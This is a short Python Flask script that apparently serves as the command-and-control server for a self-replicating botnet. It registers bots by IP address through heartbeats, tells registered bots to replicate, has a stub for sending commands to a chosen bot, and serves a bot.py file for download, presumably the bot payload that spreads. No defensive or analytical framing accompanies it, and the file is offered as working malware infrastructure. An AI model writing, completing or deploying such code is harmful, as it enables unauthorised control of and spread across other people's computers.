from flask import Flask, request, jsonify
import time

app = Flask(__name__)

# Dictionary to store bot information and commands
bots = {}

@app.route('/', methods=['POST'])
def receive_command():
    data = request.json
    command = data.get('command')
    if command == 'heartbeat':
        # Store or update bot information
        bot_id = request.remote_addr
        bots[bot_id] = {'last_heartbeat': time.time()}
        return jsonify({'status': 'success'})
    elif command == 'check_replicate':
        # Check if the bot should replicate
        bot_id = request.remote_addr
        if bot_id in bots:
            return jsonify({'replicate': True})
        else:
            return jsonify({'replicate': False})
    elif command == 'execute':
        # Execute a command on a specific bot
        bot_id = data.get('bot_id')
        if bot_id in bots:
            # Send the command to the specific bot
            # You can expand this to include more complex command handling
            return jsonify({'status': 'success', 'message': f'Command sent to bot {bot_id}'})
        else:
            return jsonify({'status': 'error', 'message': 'Bot not found'})
    return jsonify({'status': 'error', 'message': 'Invalid command'})

@app.route('/bot.py', methods=['GET'])
def serve_bot_script():
    with open('bot.py', 'rb') as f:
        return f.read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
